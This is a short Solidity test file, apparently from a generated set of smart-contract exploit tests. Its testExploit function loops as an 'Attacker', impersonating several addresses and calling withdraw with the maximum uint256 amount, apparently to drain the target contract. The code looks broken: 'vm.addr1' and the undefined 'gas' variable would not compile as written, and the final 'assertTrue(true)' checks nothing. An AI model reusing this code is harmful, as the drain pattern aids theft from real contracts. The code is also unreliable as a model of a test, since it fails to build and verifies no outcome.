// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/5684f35b-181f-4225-ac36-a9189f9c2961_Mixed.sol";

contract MixedTestExploit is BaseTestWithBalanceLog {
    MixedTest target;

    function setUp() public {
        target = new MixedTest();
    }

    function testExploit() public claim(0)  balanceLog {
        vm.startPrank(vm.addr1); // Attacker
        for (uint256 i = 0; i < 10; ++i) {
            vm.prank(vm.addr(i % 3), gas);
            target.withdraw(uint256(type(uint256).max));
        }
       	vm.stopPrank();
    
        assertTrue(true);
    }
}